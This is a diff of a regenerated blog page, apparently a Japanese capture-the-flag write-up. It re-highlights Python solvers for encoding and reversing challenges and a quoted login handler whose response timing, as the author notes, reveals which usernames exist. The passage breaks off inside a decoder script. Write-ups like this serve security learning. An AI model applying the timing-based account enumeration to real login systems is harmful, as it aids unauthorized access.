@@ -18,9 +18,9 @@
 
 <script defer src="/blog/js/lazysizes.min.fb649fcae62177dfe63e67081ddceb830b5ce1f05a4184e9bbb7d87ac4b8f4e5.js"></script>
 
-<script defer src="/blog/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
+<script defer src="/blog/js/helper/getParents.min.cd44056d552c69703dced61ae60f99166a0ddf44be93d6aa5d5127d98bf98984.js"></script>
 
-<script defer src="/blog/js/helper/fadeinout.min.1d13d3e810c3940e80cbba6216a1c76fbf42b5431fc83537ea6997863802362b.js"></script>
+<script defer src="/blog/js/helper/fadeinout.min.1551b6dbdacc77e412a26a29d3b84d2dcdc8f05c3b617433a475dc53c8872bdb.js"></script>
 
 <script defer src="/blog/js/helper/closest.min.js"></script>
   
@@ -1359,7 +1359,7 @@
     <meta property="twitter:description" content="反省文。">
   
 
-<meta name="generator" content="Hugo 0.91.2" />
+<meta name="generator" content="Hugo 0.93.2" />
 <meta name="msapplication-TileColor" content="#fff">
 
 <meta name="theme-color" content="#fff">
@@ -1796,17 +1796,17 @@ cを基準に文字コードの差を取って復元してみると、</p>
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">data</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./emoemoencode.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
-<span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="n">diff</span><span class="o">=</span><span class="p">[]</span>
-<span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
-    <span class="n">diff</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">w</span><span class="p">)</span><span class="o">-</span><span class="nb">ord</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="n">diff</span><span class="p">)</span>
-
-<span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">diff</span><span class="p">:</span>
-    <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">d</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">data</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./emoemoencode.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">diff</span><span class="o">=</span><span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">diff</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">w</span><span class="p">)</span><span class="o">-</span><span class="nb">ord</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">diff</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">diff</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">d</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>flagが出てきた。</p>
 <pre tabindex="0"><code>[0, 17, 3, -47, -1, 24, 16, 17, 2, 4, -2, 11, -51, 4, 15, -2, 13, 5, 22, -4, -1, 22, -4, 2, 10, -51, -51, -51, -51, -51, -51, 7, 6, 26]
@@ -1831,7 +1831,7 @@ atd4`qdedtUpetepqeUdaaeUeaqau
 c`b bk`kj`KbababcaKbacaKiacki
 Correct! Submit your FLAG.
 Wrong FLAG. Try again.
-;*3$&quot;
+;*3$&#34;
 GCC: (Arch Linux 9.3.0-1) 9.3.0
 </code></pre><p>なんともまぁ都合の良い文字列が。<br />
 gdb-pedaで内容をざっと見しながらデバックしてみる。<br />
@@ -1879,21 +1879,21 @@ gdb-pedaで内容をざっと見しながらデバックしてみる。<br />
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">flag</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
-<span class="n">words</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
-<span class="n">expect</span><span class="o">=</span><span class="s2">&#34;atd4`qdedtUpetepqeUdaaeUeaqau&#34;</span>
-<span class="n">expect2</span><span class="o">=</span><span class="s2">&#34;c`b bk`kj`KbababcaKbacaKiacki&#34;</span>
-
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;!&#39;</span><span class="p">),</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;~&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
-    <span class="n">words</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">expect</span><span class="p">)):</span>
-    <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">words</span><span class="p">:</span>
-        <span class="k">if</span> <span class="n">expect</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">w</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x75</span><span class="p">)</span> <span class="ow">and</span> <span class="n">expect2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">w</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffeb</span><span class="p">):</span>
-            <span class="n">flag</span><span class="o">+=</span><span class="n">w</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">words</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">expect</span><span class="o">=</span><span class="s2">&#34;atd4`qdedtUpetepqeUdaaeUeaqau&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">expect2</span><span class="o">=</span><span class="s2">&#34;c`b bk`kj`KbababcaKbacaKiacki&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;!&#39;</span><span class="p">),</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;~&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">words</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">expect</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">words</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">expect</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">w</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x75</span><span class="p">)</span> <span class="ow">and</span> <span class="n">expect2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">w</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffeb</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span><span class="o">+=</span><span class="n">w</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>改めて見るとゴリ押しもいいとこである。<br />
 得られたflagはこちら。</p>
@@ -1930,31 +1930,31 @@ gdb-pedaで内容をざっと見しながらデバックしてみる。<br />
 </span><span class="lnt">24
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">])</span>
-<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
-    <span class="n">t</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span>
-
-    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;GET&#34;</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s2">&#34;Please login.&#34;</span><span class="p">,</span> <span class="n">sec</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">{:.7f}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span><span class="o">-</span><span class="n">t</span><span class="p">))</span>
-    
-    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">:</span>
-        <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span>
-        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;password&#34;</span><span class="p">]</span>
-
-        <span class="n">exists</span><span class="p">,</span> <span class="n">account</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">get_account</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
-
-        <span class="k">if</span> <span class="ow">not</span> <span class="n">exists</span><span class="p">:</span>
-            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s2">&#34;Login failed, try again.&#34;</span><span class="p">,</span> <span class="n">sec</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">{:.7f}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span><span class="o">-</span><span class="n">t</span><span class="p">))</span>
-
-        <span class="c1"># auth.calc_password_hash(salt, password) adds salt and performs stretching so many times.</span>
-        <span class="c1"># You know, it&#39;s really secure... isn&#39;t it? :-)</span>
-        <span class="n">hashed_password</span> <span class="o">=</span> <span class="n">auth</span><span class="o">.</span><span class="n">calc_password_hash</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">SALT</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
-        <span class="k">if</span> <span class="n">hashed_password</span> <span class="o">!=</span> <span class="n">account</span><span class="o">.</span><span class="n">password</span><span class="p">:</span>
-            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s2">&#34;Login failed, try again.&#34;</span><span class="p">,</span> <span class="n">sec</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">{:.7f}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span><span class="o">-</span><span class="n">t</span><span class="p">))</span>
-
-        <span class="n">session</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">name</span>
-        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;dashboard.html&#34;</span><span class="p">,</span> <span class="n">sec</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">{:.7f}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span><span class="o">-</span><span class="n">t</span><span class="p">))</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">t</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;GET&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s2">&#34;Please login.&#34;</span><span class="p">,</span> <span class="n">sec</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">{:.7f}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span><span class="o">-</span><span class="n">t</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;password&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">exists</span><span class="p">,</span> <span class="n">account</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">get_account</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">exists</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s2">&#34;Login failed, try again.&#34;</span><span class="p">,</span> <span class="n">sec</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">{:.7f}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span><span class="o">-</span><span class="n">t</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># auth.calc_password_hash(salt, password) adds salt and performs stretching so many times.</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># You know, it&#39;s really secure... isn&#39;t it? :-)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hashed_password</span> <span class="o">=</span> <span class="n">auth</span><span class="o">.</span><span class="n">calc_password_hash</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">SALT</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">hashed_password</span> <span class="o">!=</span> <span class="n">account</span><span class="o">.</span><span class="n">password</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s2">&#34;Login failed, try again.&#34;</span><span class="p">,</span> <span class="n">sec</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">{:.7f}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span><span class="o">-</span><span class="n">t</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">session</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">name</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;dashboard.html&#34;</span><span class="p">,</span> <span class="n">sec</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">{:.7f}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span><span class="o">-</span><span class="n">t</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>どうやら最初に名前がDBにあるか確認し、無かったらメッセージを返してあったらハッシュを計算という感じ。<br />
 これならパスワード無しでも推測できるかも。<br />
@@ -1986,23 +1986,23 @@ gdb-pedaで内容をざっと見しながらデバックしてみる。<br />
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">FLAG</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;FLAG&#34;</span><span class="p">)</span>
-<span class="n">FORMAT</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;FORMAT&#34;</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">rot13_encode</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="c1">#return codecs.encode(s,&#39;rot13&#39;)</span>
-
-<span class="k">def</span> <span class="nf">base64_encode</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="c1">#return base64.b64encode(s.encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)</span>
-
-<span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">FORMAT</span><span class="p">:</span>
-    <span class="k">if</span> <span class="n">t</span> <span class="o">==</span> <span class="s2">&#34;R&#34;</span><span class="p">:</span>
-        <span class="n">FLAG</span> <span class="o">=</span> <span class="s2">&#34;R&#34;</span> <span class="o">+</span> <span class="n">rot13_encode</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">t</span> <span class="o">==</span> <span class="s2">&#34;B&#34;</span><span class="p">:</span>
-        <span class="n">FLAG</span> <span class="o">=</span> <span class="s2">&#34;B&#34;</span> <span class="o">+</span> <span class="n">base64_encode</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">FLAG</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;FLAG&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">FORMAT</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;FORMAT&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rot13_encode</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#return codecs.encode(s,&#39;rot13&#39;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">base64_encode</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#return base64.b64encode(s.encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">FORMAT</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">t</span> <span class="o">==</span> <span class="s2">&#34;R&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FLAG</span> <span class="o">=</span> <span class="s2">&#34;R&#34;</span> <span class="o">+</span> <span class="n">rot13_encode</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">t</span> <span class="o">==</span> <span class="s2">&#34;B&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FLAG</span> <span class="o">=</span> <span class="s2">&#34;B&#34;</span> <span class="o">+</span> <span class="n">base64_encode</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>コメントの部分は推測するために自分で付け足した。（元々は無い）<br />
 デコードするときはこれの逆の処理をするプログラムを書けば良い。<br />
@@ -2037,32 +2037,32 @@ gdb-pedaで内容をざっと見しながらデバックしてみる。<br />
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">getenv</span>
-<span class="kn">import</span> <span class="nn">base64</span>
-<span class="kn">import</span> <span class="nn">codecs</span>
-
-<span class="n">encoded</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./encoded_flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
-<span class="n">flag</span><span class="o">=</span><span class="n">encoded</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
-
-<span class="k">def</span> <span class="nf">rot13_decode</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">codecs</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s1">&#39;rot13&#39;</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">base64_decode</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
-
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
-    <span class="k">if</span> <span class="n">flag</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;R&#34;</span><span class="p">:</span>
-        <span class="n">flag</span><span class="o">=</span><span class="n">flag</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
-        <span class="n">flag</span> <span class="o">=</span> <span class="n">rot13_decode</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
-
-    <span class="k">if</span> <span class="n">flag</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;B&#34;</span><span class="p">:</span>
-        <span class="n">flag</span><span class="o">=</span><span class="n">flag</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
-        <span class="n">flag</span> <span class="o">=</span> <span class="n">base64_decode</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
-
-    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;result:&#34;</span><span class="p">,</span><span class="n">flag</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">getenv</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">codecs</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">encoded</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./encoded_flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="n">encoded</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rot13_decode</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">codecs</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s1">&#39;rot13&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">base64_decode</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">flag</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;R&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flag</span><span class="o">=</span><span class="n">flag</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">=</span> <span class="n">rot13_decode</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">flag</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;B&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flag</span><span class="o">=</span><span class="n">flag</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
